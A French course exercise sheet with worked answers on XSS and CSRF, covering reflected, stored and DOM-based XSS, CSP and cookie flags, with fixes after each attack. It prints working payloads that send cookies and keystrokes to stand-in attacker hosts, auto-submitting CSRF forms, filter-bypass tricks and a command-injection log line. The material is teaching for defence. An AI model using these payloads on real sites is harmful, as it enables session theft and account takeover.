---
title: "Exercices -- XSS et CSRF"
sidebar_position: 5
---

# Exercices -- XSS et CSRF

> Following teacher instructions from: S6/Vulnerabilites/data/moodle/guide/03_xss_csrf.md
> Source du cours : 2026 CSRF XSS.pdf

---

## Exercice 1 : Identifier les types d'attaque (sujet DS 2025, Q1.1)

### Pour chaque requete dans les logs, identifiez le type d'attaque

| Requete | Type | Justification |
|---------|------|---------------|
| `/search="<SCRipt>alert(42)</SCRipt>"` | XSS | Balise script injectee (casse mixte pour contourner les filtres) |
| `/stuff.php?id=42 UNION SELECT 1,1,null --` | SQL | Mot-cle UNION SELECT = extraction de donnees depuis une autre table |
| `/test.php?traceroute="\|\| echo reboot > /etc/rc.local"` | CMD | Separateur `\|\|` + commande shell (`echo`) + redirection (`>`) |
| `/set.php?WifiKey=ABC123` | CSRF | Action sur un parametre sensible (cle WiFi) sans token de verification |
| `/scripts/admin.php.bak` | INFO | Fichier de sauvegarde expose (reconnaissance, exploration) |
| `/images/lo%67o.png` | INFO | Encodage URL (`%67` = `g`), simple exploration |

**Answer:**

Methode systematique pour identifier le type d'attaque :

```
Indices --> XSS :   <script>, <img onerror, alert(, javascript:, <svg onload, <SCRipt>
Indices --> SQL :   UNION, SELECT, OR 1=1, '--, #, ORDER BY, information_schema
Indices --> CMD :   ;, |, ||, &&, commandes shell (echo, cat, rm, sleep, /bin/*)
Indices --> CSRF :  URL d'action modificatrice sans token/confirmation
Indices --> INFO :  .bak, .old, .log, .env, exploration de chemins, path traversal
```

**Security explanation:**

L'identification du type d'attaque est la premiere etape de la reponse a incident. Chaque type d'attaque a des contre-mesures specifiques : echappement des sorties pour XSS, requetes preparees pour SQL, whitelist pour CMD, tokens anti-CSRF pour CSRF.

---

## Exercice 2 : CSRF -- Comprendre le mecanisme (methode GET)

### Un routeur WiFi a l'adresse 192.168.0.1 permet de changer la cle WPA via :
```
GET http://192.168.0.1/WPA.php?key=91B8A3
```

### Q1 : Construisez une page malicieuse qui change la cle WPA de la victime

**Answer:**

```html
<html>
<body>
  <h1>Vous avez gagne un prix !</h1>
  <img src="http://192.168.0.1/WPA.php?key=00DEAD" style="display:none">
</body>
</html>
```

Trace d'execution :
1. La victime est connectee a son routeur (cookie de session actif dans le navigateur)
2. La victime visite la page malicieuse (phishing, lien dans un email)
3. Le navigateur parse le HTML et tente de charger l'image
4. Le navigateur envoie la requete GET a `192.168.0.1/WPA.php?key=00DEAD`
5. Le navigateur joint **automatiquement** le cookie d'authentification du routeur
6. Le routeur recoit la requete avec le cookie valide
7. Le routeur change la cle WPA a "00DEAD"
8. La victime est deconnectee du WiFi
9. L'attaquant connait la nouvelle cle et peut se connecter

### Q2 : Construisez une page malicieuse pour la methode POST

**Answer:**

Si le routeur utilise POST au lieu de GET :
```html
<html>
<body>
  <h1>Chargement en cours...</h1>
  <form action="http://192.168.0.1/change/key" method="POST" id="csrf">
    <input type="hidden" name="key" value="00DEAD" />
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

Trace d'execution :
1. La victime visite la page malicieuse
2. Le formulaire cache se soumet automatiquement via `JavaScript submit()`
3. Le navigateur envoie la requete POST avec le cookie du routeur
4. Le routeur traite la requete comme legitime
5. La cle WPA est changee

**Note :** passer de GET a POST ne protege PAS du CSRF. Un formulaire HTML cache peut soumettre un POST.

### Q3 : Comment proteger le routeur ?

**Answer:**

| Protection | Mecanisme | Efficacite |
|-----------|-----------|-----------|
| `SameSite=Strict` | Le navigateur n'envoie pas le cookie si la requete vient d'un autre site | Forte -- bloque les requetes cross-origin |
| Token anti-CSRF | Valeur aleatoire dans chaque formulaire, verifiee cote serveur | Forte -- l'attaquant ne peut pas predire le token |
| Verification Referer | Verifier que le header Referer vient du meme domaine | Moyenne -- peut etre supprime ou forge |
| Confirmation mot de passe | Demander le mot de passe actuel avant tout changement | Forte -- l'attaquant ne connait pas le mot de passe |

**Security explanation:**

Le CSRF exploite la confiance du serveur dans le navigateur de la victime. Le navigateur joint automatiquement les cookies, donc toute requete envoyee depuis le navigateur est authentifiee. La meilleure protection est `SameSite=Strict` sur les cookies d'authentification, combinee avec un token anti-CSRF.

---

## Exercice 3 : XSS reflete -- Exploitation complete

### Application vulnerable :
```php
<?php
echo "Resultats de recherche pour : " . $_GET['q'];
?>
```

### Q1 : Donnez une URL qui execute du JavaScript

**Answer:**

```
/search.php?q=<script>alert(document.cookie)</script>
```

Code HTML genere par le serveur :
```html
Resultats de recherche pour : <script>alert(document.cookie)</script>
```

Trace d'execution :
1. Le navigateur de la victime recoit la page HTML
2. Le parser HTML rencontre la balise `<script>`
3. Le moteur JavaScript execute `alert(document.cookie)`
4. Une boite de dialogue affiche le contenu du cookie de session

### Q2 : Comment voler le cookie de session de la victime ?

**Answer:**

**Payload avec evenement d'erreur (discret) :**
```
/search.php?q=<img src=0 onerror="window.location='http://attaquant.com/get.php?cookie='+document.cookie">
```

Trace d'execution :
1. Le navigateur tente de charger l'image "0" (source invalide)
2. L'evenement `onerror` se declenche
3. JavaScript execute : `window.location = 'http://attaquant.com/get.php?cookie=' + document.cookie`
4. Le navigateur redirige vers le serveur de l'attaquant avec le cookie en parametre
5. L'attaquant enregistre le cookie dans ses logs
6. L'attaquant utilise le cookie pour usurper la session de la victime

**Payload alternatif (sans redirection visible) :**
```html
<script>
  new Image().src = 'http://attaquant.com/get.php?c=' + document.cookie;
</script>
```

Ce payload envoie le cookie via une requete d'image invisible, sans rediriger la victime.

**Payload avec chargement de script distant :**
```html
<SCRIPT SRC=http://attaquant.com/evil.js></SCRIPT>
```

Permet de charger un script complet depuis le serveur de l'attaquant.

### Q3 : Variante avec contournement de filtre

**Answer:**

Si l'application filtre `<script>` :
```
/search.php?q=<SCRipt>alert(42)</SCRipt>
```
(casse mixte pour contourner les filtres naifs)

Si les balises script sont bloquees :
```
/search.php?q=<img onerror=alert('xss') src="xss">
```

Si le HTML est filtre mais pas les attributs :
```
/search.php?q=<a href="javascript:alert('XSS')">xss</a>
```

### Q4 : Corrigez le code

**Answer:**

```php
<?php
echo "Resultats de recherche pour : " . htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');
?>
```

Decomposition de la protection :
- `htmlspecialchars` : convertit `<` en `&lt;`, `>` en `&gt;`, `"` en `&quot;`, `&` en `&amp;`
- `ENT_QUOTES` : convertit aussi les apostrophes `'` en `&#039;`
- `'UTF-8'` : specifie l'encodage pour eviter les attaques par encodage multi-octets

Resultat avec le payload :
```html
Resultats de recherche pour : &lt;script&gt;alert(document.cookie)&lt;/script&gt;
```

Le navigateur affiche le texte tel quel, sans executer de JavaScript.

**Security explanation:**

Le principe fondamental anti-XSS est : **"Never trust an output!"** Contrairement a l'injection SQL ou on protege l'entree (input), en XSS on protege la sortie (output) envoyee au navigateur. Il faut echapper TOUTES les sorties qui contiennent des donnees utilisateur.

---

## Exercice 4 : XSS stocke -- Impact massif

### Un forum permet de poster des commentaires. Le commentaire est affiche tel quel dans la page HTML.

### Q1 : Quelle est la difference avec un XSS reflete ?

**Answer:**

| Critere | XSS reflete | XSS stocke |
|---------|-------------|------------|
| Persistence | Non (dans l'URL) | Oui (en base de donnees) |
| Victimes | Celles qui cliquent sur le lien | Tous les visiteurs de la page |
| Detectabilite | URL suspecte visible | Rien de visible pour la victime |
| Necessite UI ? | Oui (cliquer sur un lien) | Non (visiter la page suffit) |

### Q2 : Montrez une exploitation avec keylogger distant

**Answer:**

L'attaquant poste le commentaire suivant :
```html
Super article ! <script src="http://attaquant.com/keylogger.js"></script>
```

Trace d'execution :
1. Le commentaire est stocke en base de donnees (avec la balise script)
2. Un utilisateur quelconque visite la page du forum
3. Le serveur genere le HTML incluant le commentaire tel quel
4. Le navigateur de la victime charge `keylogger.js` depuis le serveur de l'attaquant
5. Le script s'execute dans le contexte de securite du forum
6. Le keylogger enregistre toutes les frappes clavier de la victime
7. Les frappes sont envoyees au serveur de l'attaquant
8. Si la victime se connecte, l'attaquant capture ses credentials

Contenu possible de keylogger.js :
```javascript
document.addEventListener('keypress', function(e) {
    new Image().src = 'http://attaquant.com/log?key=' + e.key;
});
```

### Q3 : Quelles protections implementer ?

**Answer:**

**Protection 1 -- Echapper les sorties (obligatoire) :**
```php
echo htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
```

**Protection 2 -- CSP (defense en profondeur) :**
```
Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
```
Bloque tout script inline et tout script provenant d'un domaine externe.

**Protection 3 -- Cookie HttpOnly (limiter l'impact) :**
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```
Meme si le XSS fonctionne, `document.cookie` retourne une chaine vide pour les cookies HttpOnly.

**Protection 4 -- Validation a l'entree (complement) :**
Rejeter ou nettoyer les balises HTML dans les commentaires avec une whitelist de balises autorisees (`<b>`, `<i>`, `<a>`).

---

## Exercice 5 : XSS DOM-based

### Page HTML avec message de bienvenue :
```html
<html>
<body>
  <div id="welcome"></div>
  <script>
    var name = document.location.hash.substring(1);
    document.getElementById('welcome').innerHTML = 'Bonjour ' + name;
  </script>
</body>
</html>
```

### Q1 : Montrez qu'une XSS DOM-based est possible

**Answer:**

**Payload (dans le fragment URL) :**
```
http://example.com/page.html#<img src=0 onerror=alert(document.cookie)>
```

Trace d'execution :
1. Le navigateur charge la page
2. JavaScript lit `document.location.hash` = `"#<img src=0 onerror=alert(document.cookie)>"`
3. `.substring(1)` supprime le `#`
4. `innerHTML` injecte directement le HTML dans le DOM
5. Le navigateur interprete la balise `<img>` et declenche `onerror`
6. `alert()` s'execute avec le cookie de session

**Particularite :** le fragment (`#...`) n'est JAMAIS envoye au serveur. L'attaque est entierement cote client. Les WAF et les logs serveur ne la detectent pas.

### Q2 : Corrigez le code

**Answer:**

**Correction : `textContent` au lieu de `innerHTML`**
```javascript
var name = document.location.hash.substring(1);
document.getElementById('welcome').textContent = 'Bonjour ' + name;
```

`textContent` traite la valeur comme du texte brut, jamais comme du HTML. Les balises sont affichees telles quelles sans etre interpretees.

**Security explanation:**

Les trois types de XSS sont :
- **Reflete** : le code est dans l'URL/requete, le serveur le "reflete" dans la reponse. Necessite que la victime clique sur un lien.
- **Stocke** : le code est stocke sur le serveur (BDD, commentaire). Tous les visiteurs sont touches.
- **DOM-based** : le code modifie le DOM cote client sans passer par le serveur. Invisible dans les logs.

---

## Exercice 6 : Comparaison XSS vs CSRF

### Remplissez le tableau comparatif

**Answer:**

| Aspect | XSS | CSRF |
|--------|-----|------|
| L'attaquant injecte du code ? | Oui (JavaScript) | Non (simple requete HTTP) |
| La victime doit etre authentifiee ? | Non (mais utile pour voler un cookie) | **Oui** (indispensable, le navigateur doit joindre le cookie) |
| Le serveur est vulnerable aux injections ? | **Oui** (ne filtre pas les sorties) | Pas necessairement (le serveur fonctionne normalement) |
| Le code s'execute dans le navigateur ? | Oui (JS dans le contexte de la page) | Non (juste une requete HTTP automatique) |
| Cible principale | Le **navigateur** de la victime | Le **serveur** via le navigateur de la victime |
| Protection principale | Echapper les sorties + CSP | SameSite + token anti-CSRF |
| Principe de protection | "Never trust an output" | "Verifier l'origine de la requete" |

**Point cle :** un XSS peut etre utilise pour realiser un CSRF (car le script injecte peut soumettre des formulaires), mais un CSRF ne peut pas realiser un XSS (il n'injecte pas de code).

---

## Exercice 7 : Content Security Policy (CSP)

### Q1 : Analysez ce header CSP

```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com; style-src 'self'; img-src *; object-src 'none'
```

**Answer:**

| Directive | Signification |
|----------|---------------|
| `script-src 'self' https://cdn.trusted.com` | Scripts autorises uniquement depuis le meme domaine ou cdn.trusted.com |
| `style-src 'self'` | Feuilles de style uniquement depuis le meme domaine |
| `img-src *` | Images autorisees depuis n'importe quelle source |
| `object-src 'none'` | Aucun plugin (Flash, Java) autorise |

### Q2 : Un attaquant injecte `<script>alert('xss')</script>`. Que se passe-t-il ?

**Answer:**

Le script **inline** est bloque par la CSP. La directive `script-src` ne contient pas `'unsafe-inline'`. Le navigateur affiche :
```
Refused to execute inline script because it violates the following
Content Security Policy directive: "script-src 'self' https://cdn.trusted.com"
```

### Q3 : L'attaquant essaie `<script src="http://evil.com/bad.js"></script>`. Resultat ?

**Answer:**

Le domaine `evil.com` n'est pas dans la whitelist. Le script est bloque :
```
Refused to load the script 'http://evil.com/bad.js' because it violates the following
Content Security Policy directive: "script-src 'self' https://cdn.trusted.com"
```

### Q4 : L'attaquant essaie `<img src="http://evil.com/track?c=cookie">`. Resultat ?

**Answer:**

L'image est **autorisee** car `img-src *` autorise toutes les sources d'images. L'attaquant peut exfiltrer des donnees via des requetes d'images. `img-src *` est dangereux car il permet l'exfiltration de donnees meme si la CSP bloque les scripts.

---

## Exercice 8 : Protection cookie -- tous les flags

### Expliquez chaque flag du header suivant :
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

**Answer:**

| Flag | Role | Protection contre |
|------|------|------------------|
| `HttpOnly` | Interdit l'acces JavaScript via `document.cookie` | XSS (vol de cookie) |
| `Secure` | Cookie envoye uniquement via HTTPS | Interception sur HTTP |
| `SameSite=Strict` | Cookie non envoye dans les requetes cross-origin | CSRF |
| `Path=/` | Cookie valable pour tout le site | Isolation des chemins |
| `Max-Age=3600` | Cookie expire apres 1 heure | Limite la fenetre d'exploitation |

**Attention piege DS :** `HttpOnly` empeche le vol de cookie par `document.cookie`, mais ne protege PAS contre :
- La modification du DOM (l'attaquant peut modifier la page)
- La redirection vers un site de phishing
- L'envoi de requetes au nom de la victime (le cookie est quand meme joint)
- Le keylogging (capture des frappes)

---

## Exercice 9 : Scenario complet (type DS)

### Un site e-commerce a les fonctionnalites suivantes :
1. Barre de recherche : `/search?q=QUERY`
2. Page de profil : affiche le nom d'utilisateur
3. Changement d'email : `POST /settings/email` avec body `email=new@email.com`

### Q1 : Identifiez les vulnerabilites potentielles

**Answer:**

**Recherche (XSS reflete) :**
Si l'entree n'est pas echappee :
```php
echo "Resultats pour : " . $_GET['q'];
```
Un attaquant envoie un lien contenant `<script>...</script>`.

**Profil (XSS stocke) :**
Si le nom d'utilisateur est affiche sans echappement, un utilisateur peut enregistrer :
```
<script>fetch('http://evil.com/?c='+document.cookie)</script>
```
Ce script s'execute pour chaque visiteur du profil.

**Changement d'email (CSRF) :**
Si le formulaire n'a pas de token anti-CSRF :
```html
<form action="https://shop.com/settings/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

### Q2 : Proposez les corrections

**Answer:**

```
1. Recherche : htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8')
2. Profil   : htmlspecialchars($username, ENT_QUOTES, 'UTF-8')
3. Email    : token anti-CSRF + verification du mot de passe actuel
4. Global   : CSP script-src 'self' + HttpOnly cookies + SameSite=Strict
```

**Security explanation:**

Le CSRF sur le changement d'email est plus grave qu'il n'y parait : si l'attaquant change l'email de la victime, il peut ensuite utiliser "mot de passe oublie" pour prendre le controle total du compte.

---

## Hierarchie des protections XSS (a retenir pour le DS)

```
Meilleure protection
    |
    v
1. CSP stricte (nonce-based, pas de 'unsafe-inline')
2. Echapper systematiquement TOUTES les sorties (htmlspecialchars)
3. HttpOnly + Secure + SameSite sur les cookies
4. Tainting / marquage des variables utilisateur
5. Validation des entrees (complement, pas suffisant seul)
    |
    v
Protection minimale
```

---

## Pieges courants en DS

1. **Confondre XSS et CSRF** : XSS injecte du CODE, CSRF forge une REQUETE
2. **Penser que validation des entrees suffit contre XSS** : il faut echapper les SORTIES
3. **Oublier `ENT_QUOTES` dans `htmlspecialchars`** : les apostrophes ne sont pas echappees par defaut
4. **Penser que HttpOnly protege contre toute XSS** : il empeche juste le vol de cookie
5. **Confondre XSS reflete et stocke** : stocke = en BDD, touche tout le monde, pas besoin de lien
6. **Ignorer le XSS DOM-based** : entierement cote client, invisible dans les logs serveur
7. **Oublier que POST ne protege pas du CSRF** : un formulaire HTML cache peut soumettre un POST
8. **Confondre SameSite=Strict et SameSite=Lax** : Lax autorise les requetes GET cross-origin
